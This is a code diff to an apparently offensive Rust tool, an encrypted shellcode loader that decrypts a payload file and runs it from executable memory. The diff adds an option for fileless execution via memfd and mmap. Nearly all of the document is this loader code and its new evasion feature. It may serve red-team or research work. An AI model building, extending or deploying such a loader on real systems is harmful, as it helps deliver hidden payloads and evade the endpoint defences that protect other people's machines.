@@ -1,6 +1,7 @@
 use std::fs;
 use libc;
 use lib::crypt;
+use lib::fileless;
 use clap::{Parser};
 use lib::config::Config;
 use lib::crypt::Algo;
@@ -23,6 +24,10 @@ struct Args {
     /// verbose mode
     #[arg(short, long)]
     verbose: bool,
+
+    /// Use fileless execution with memfd + mmap (requires Linux 3.17+)
+    #[arg(long)]
+    fileless_mmap: bool,
 }
 
 fn read_shellcode(path: &str, config: &Config) -> Vec<u8> {
@@ -36,7 +41,7 @@ fn alloc_executable_memory(size: usize, config: &Config) -> *mut libc::c_void {
         let mem = libc::mmap(std::ptr::null_mut(), size, libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
         libc::MAP_PRIVATE | libc::MAP_ANON, -1, 0);
         if mem == libc::MAP_FAILED {
-            config.log("mmap faile!");
+            config.log("mmap failed!");
             eprintln!("mmap failed");
             std::process::exit(1);
         }
@@ -91,12 +96,20 @@ fn decrypt_shellcode(shellcode: &mut Vec<u8>, file: &str, algo: Option<Algo>, ke
     crypt::create_cipher(&key).decrypt(shellcode);
 }
 
-fn run_shellcode(shellcode: &[u8], config: &Config) {
-    let size = shellcode.len();
-    let mem = alloc_executable_memory(size, config);
-    copy_to_mem(shellcode, mem, config);
-    exec(mem, config);
-    free_mem(mem, size, config);
+fn run_shellcode(shellcode: &[u8], config: &Config, use_fileless_mmap: bool) {
+    if use_fileless_mmap {
+        fileless::execute_fileless_mmap(shellcode, config)
+            .unwrap_or_else(|e| {
+                eprintln!("{}", e);
+                std::process::exit(1);
+            });
+    } else {
+        let size = shellcode.len();
+        let mem = alloc_executable_memory(size, config);
+        copy_to_mem(shellcode, mem, config);
+        exec(mem, config);
+        free_mem(mem, size, config);
+    }
 }
 
 fn main() {
@@ -107,7 +120,7 @@ fn main() {
 
     let mut shellcode = read_shellcode(&args.file, &config);
     decrypt_shellcode(&mut shellcode, &args.file, args.algo, args.key, &config);
-    run_shellcode(&shellcode, &config);
+    run_shellcode(&shellcode, &config, args.fileless_mmap);
 
     config.log("Done!");
 }
